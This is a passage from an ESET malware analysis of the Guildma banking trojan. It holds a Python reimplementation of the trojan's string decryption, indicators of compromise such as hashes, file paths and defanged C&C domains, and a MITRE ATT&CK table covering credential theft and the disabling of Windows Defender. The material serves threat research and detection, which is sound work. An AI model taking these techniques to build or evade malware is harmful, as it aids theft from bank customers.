</span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">10</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xff</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-19">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-20"><span class="crayon-h">	</span><span class="crayon-p"># stage 4 - Base25 decode and key subtraction</span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-21"><span class="crayon-h">	</span><span class="crayon-v">k</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">ord</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-22"><span class="crayon-h">	</span><span class="crayon-v">ot</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-23"><span class="crayon-h">	</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">range</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">len</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-24"><span class="crayon-h">		</span><span class="crayon-v">ot</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-e">chr</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">ord</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-cn">25</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">ord</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">k</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">100</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-25">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-26"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">ot</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p><em>Figure 10. New string encryption algorithm</em></p>
<p>Originally, Guildma was using the same string encryption as <a href="https://www.welivesecurity.com/2019/10/03/casbaneiro-trojan-dangerous-cooking/">Casbaneiro</a>. The new algorithm has four stages and as you can see, the original string encryption algorithm is still used as the first stage. Also of note is the fact that the fourth stage is once again using <a href="https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/">Mispadu’s</a> encryption algorithm.</p>
<p>In version 148 Guildma implemented a string table; all strings are decrypted at the beginning of execution and accessed from the table when needed.</p>
<h3>Removal of international targets</h3>
<p>In version 138, Guildma added capability to target institutions (mainly banks) outside of Brazil. Despite that, we have observed no international campaigns; the campaigns hosting files on Cloudflare Workers’ infrastructure even went as far as to block any downloads from non-Brazilian IPs. In fact, in the last 14 months we haven’t seen any campaign targeting users outside of Brazil.</p>
<p>Finally, in version 145, the capability to target institutions outside of Brazil was removed. Based on these facts, we believe it was merely an in-development feature which ended up being scrapped.</p>
<h2>Conclusion</h2>
<p>In this part of the series, we have talked about Guildma, the most prevalent Latin American banking trojan we have seen. We have shown its rich historical developments while focusing on the most recent variant.</p>
<p>Guildma once again shares the prevailing characteristics of a Latin American banking trojan. It is written in Delphi, targets the region, implements backdoor functionality, splits its functionality into many modules and abuses legitimate tools.</p>
<p>Guildma also shares interesting common features with families described earlier in this series. Namely, its current encryption algorithm combines the ones used by Casbaneiro and Mispadu.</p>
<p><em>For any inquiries, contact us at threatintel@eset.com. Indicators of Compromise can also be found in <a href="https://github.com/eset/malware-ioc/tree/master/guildma" target="_blank" rel="noopener">our GitHub repository</a><strong>.</strong></em></p>
<h2>Indicators of Compromise (IoCs)</h2>
<h3>Hashes</h3>

<table id="tablepress-801" class="tablepress tablepress-id-801">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">Description</th><th class="column-3">ESET Detection name</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">45c58bc40768dce6a6c611e08fd34c62441aa776</span></td><td class="column-2">Main module loader 1</td><td class="column-3">Win32/Spy.Guildma.BM</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">861f20b0dcc55f94b4c43e4a7e77f042c21506cf</span></td><td class="column-2">Main module injector</td><td class="column-3">Win32/Spy.Guildma.BJ</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">37fd19b1ab1dcc25e07bc96d4c02d81cf4edb8a1</span></td><td class="column-2">Main module loader 2</td><td class="column-3">Win32/Spy.Guildma.Q</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">a7b10b8de2b0ef898cff31fa2d9d5cbaae2e9d0d</span></td><td class="column-2">Main module</td><td class="column-3">Win32/Spy.Guildma.BS</td>
</tr>
<tr class="row-6 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">4f65736a9d6b94b376c58b3cdcb49bbd295cd8cc</span></td><td class="column-2">Contacts stealer and form grabber</td><td class="column-3">Win32/Spy.Guildma.D</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">6c9304c5862d4e0de1c86d7ae3764f5e8358daff</span></td><td class="column-2">RAT module (DLL)</td><td class="column-3">Win32/Spy.Guildma.BR</td>
</tr>
<tr class="row-8 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">89fbffe456de850f7abf4f97d3b9da4bad6afb57</span></td><td class="column-2">RAT module (EXE)</td><td class="column-3">Win32/Spy.Guildma.BR</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">af0d495ecc3622b14a40ddcd8005873c5ddc3a2d</span></td><td class="column-2">MailPassView</td><td class="column-3">Win32/PSWTool.MailPassView.E</td>
</tr>
<tr class="row-10 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">92bcf54079cbba04f584eac4486473c3abdd88cd</span></td><td class="column-2">WebBrowserPassView</td><td class="column-3">Win32/PSWTool.WebBrowserPassView.E</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">a2048f435f076988bf094274192a196216d75a5f</span></td><td class="column-2">JScript dropper module</td><td class="column-3">Win32/Spy.Guildma.BP</td>
</tr>
</tbody>
</table>

<h3>Filenames</h3>
<p><span style="font-family: courier new, courier, monospace;">C:\Users\Public\Libraries\qlanl\*</span></p>
<h3>Startup link</h3>
<ul>
<li>Location</li>
</ul>
<p><span style="font-family: courier new, courier, monospace;">%APPDATA%\Microsoft\Programs\StartUp\reiast%USERNAME%%COMPUTERNAME%.lnk</span></p>
<ul>
<li>Targets</li>
</ul>
<p><span style="font-family: courier new, courier, monospace;">C:\Program Files (x86)\Internet Explorer\ExtExport.exe</span><br />
<span style="font-family: courier new, courier, monospace;">C:\Program Files\Internet Explorer\ExtExport.exe</span></p>
<ul>
<li>Args</li>
</ul>
<p><span style="font-family: courier new, courier, monospace;">&lt;install dir&gt; &lt;rand&gt; &lt;rand&gt;</span><br />
(where <span style="font-family: courier new, courier, monospace;">&lt;rand&gt;</span> is a random, 5 to 9 character long string generated from the alphabet <span style="font-family: courier new, courier, monospace;">qwertyuiop1lgfdsas2dfghj3zcvbnmm</span>)</p>
<h3>C&amp;C servers</h3>
<ul>
<li>https://www.zvatrswtsrw[.]ml</li>
<li>https://xskcjzamlkxwo[.]gq</li>
<li>https://www.vhguyeu[.]ml</li>
<li>https://www.carnataldez[.]ml</li>
<li>https://www.movbmog[.]ga</li>
<li>https://iuiuytrytrewrqw[.]gq</li>
<li>https://www.gucinowertr[.]tk</li>
<li>https://equilibrios[.]ga</li>
<li>https://www.clooinfor[.]cf</li>
<li>https://ambirsr[.]tk</li>
<li>https://dbuhcbudyu[.]tk</li>
<li>https://nvfjvtntt[.]cf</li>
<li>http://whia7g.acquafufheirybveru[.]online</li>
</ul>
<h2>MITRE ATT&amp;CK techniques</h2>

<table id="tablepress-802" class="tablepress tablepress-id-802">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Tactic</th><th class="column-2">ID</th><th class="column-3">Name</th><th class="column-4">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">Initial Access</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1193/" rel="noopener" target="_blank">T1193</a></td><td class="column-3">Spearphishing Attachment</td><td class="column-4">Guildma distribution chains start with a malicious email attachment.</td>
</tr>
<tr class="row-3 odd">
	<td rowspan="2" class="column-1">Execution</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1073/" rel="noopener" target="_blank">T1073</a></td><td class="column-3">Rundll32</td><td class="column-4">Guildma utilizes <span style="font-family: courier new, courier, monospace;">rundll32.exe</span> to execute its binary modules.<br />
</td>
</tr>
<tr class="row-4 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1047/" rel="noopener" target="_blank">T1047</a></td><td class="column-3">Windows Management Instrumentation</td><td class="column-4">Guildma abuses  <span style="font-family: courier new, courier, monospace;"> WMIC.exe</span> to execute some of its distribution chain stages.<br />
</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">Persistence</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1060/" rel="noopener" target="_blank">T1060</a></td><td class="column-3">Registry Run Keys / Startup Folder</td><td class="column-4">Guildma ensures persistence by creating a LNK file in the %STARTUP% folder.</td>
</tr>
<tr class="row-6 even">
	<td rowspan="8" class="column-1">Defense Evasion</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1197/" rel="noopener" target="_blank">T1197</a></td><td class="column-3">BITS Jobs</td><td class="column-4"><span style="font-family: courier new, courier, monospace;">BITSAdmin.exe</span>  is used to download binary modules.</td>
</tr>
<tr class="row-7 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1089/" rel="noopener" target="_blank">T1089</a></td><td class="column-3">Disabling Security Tools</td><td class="column-4">Guildma disables Windows Defender.</td>
</tr>
<tr class="row-8 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1140/" rel="noopener" target="_blank">T1140</a></td><td class="column-3">Deobfuscate/Decode Files or Information</td><td class="column-4">The majority of Guildma modules need to be decrypted after downloading.</td>
</tr>
<tr class="row-9 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1073/" rel="noopener" target="_blank">T1073</a></td><td class="column-3">DLL Side-Loading</td><td class="column-4">Guildma abuses <span style="font-family: courier new, courier, monospace;">ExtExport.exe</span> for DLL Side-Loading.</td>
</tr>
<tr class="row-10 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1096/" rel="noopener" target="_blank">T1096</a></td><td class="column-3">NTFS File Attributes</td><td class="column-4">Guildma utilizes ADS to hide its modules on disk.</td>
</tr>
<tr class="row-11 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1055/" rel="noopener" target="_blank">T1055</a></td><td class="column-3">Process Injection</td><td class="column-4">Guildma utilizes process injection when executing its modules.</td>
</tr>
<tr class="row-12 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1064/" rel="noopener" target="_blank">T1064</a></td><td class="column-3">Scripting</td><td class="column-4">Guildma implements its distribution chain stages in various scripting languages (mainly JScript).</td>
</tr>
<tr class="row-13 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1220/" rel="noopener" target="_blank">T1220</a></td><td class="column-3">XSL Script Processing</td><td class="column-4">Guildma utilizes XSL script(s) in its distribution chains.</td>
</tr>
<tr class="row-14 even">
	<td rowspan="2" class="column-1">Credential Access</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1081/" rel="noopener" target="_blank">T1081</a></td><td class="column-3">Credentials in Files</td><td class="column-4">Guildma extracts credentials stored by web browsers and email clients in files.</td>
</tr>
<tr class="row-15 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1214/" rel="noopener" target="_blank">T1214</a></td><td class="column-3">Credentials in Registry</td><td class="column-4">Guildma extracts credentials stored by web browsers and email clients in Windows Registry.</td>
</tr>
<tr class="row-16 even">
	<td rowspan="5" class="column-1">Discovery</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1083/" rel="noopener" target="_blank">T1083</a></td><td class="column-3">File and Directory Discovery</td><td class="column-4">Guildma uses presence of certain files to determine whether banking and security tools are installed.</td>
</tr>
<tr class="row-17 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1010/" rel="noopener" target="_blank">T1010</a></td><td class="column-3">Application Window Discovery</td><td class="column-4">Guildma uses window discovery to find and terminate older versions of itself and to detect when interesting programs (e.g. banking applications or web browsers) are running. </td>
</tr>
<tr class="row-18 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1063/" rel="noopener" target="_blank">T1063</a></td><td class="column-3">Security Software Discovery</td><td class="column-4">Guildma detects the presence of several security products. </td>
</tr>
<tr class="row-19 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1082/" rel="noopener" target="_blank">T1082</a></td><td class="column-3">System Information Discovery</td><td class="column-4">Guildma collects OS version and bitness, computer name and system locale. </td>
</tr>
<tr class="row-20 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1497/" rel="noopener" target="_blank">T1497</a></td><td class="column-3">Virtualization/Sandbox Evasion</td><td class="column-4">Guildma uses directory names, computer names, volume IDs, and existence of named objects to detect sandboxes and virtualized environments. </td>
</tr>
<tr class="row-21 odd">
	<td class="column-1">Collection</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1113/" rel="noopener" target="_blank">T1113</a></td><td class="column-3">Screen Capture</td><td class="column-4">Guildma is capable of taking screenshots.</td>
</tr>
<tr class="row-22 even">
	<td class="column-1">Command and Control</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1024/" rel="noopener" target="_blank">T1024</a></td><td class="column-3">Custom Cryptographic Protocol</td><td class="column-4">New C&amp;C addresses are encrypted using custom encryption algorithms. </td>
</tr>
<tr class="row-23 odd">
	<td class="column-1">Exfiltration</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1041/" rel="noopener" target="_blank">T1041</a></td><td class="column-3">Exfiltration Over Command and Control Channel</td><td class="column-4">Guildma uploads screenshots and log files to the C&amp;C server.</td>
</tr>
</tbody>
</table>


                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2020-03-05 11:30:07">5 Mar 2020 - 11:30AM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="Guildma: The Devil drives electric">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="Guildma: The Devil drives electric">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="Guildma: The Devil drives electric">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="Guildma: The Devil drives electric">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F05%2Fguildma-devil-drives-electric%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F05%2Fguildma-devil-drives-electric%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F05%2Fguildma-devil-drives-electric%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is 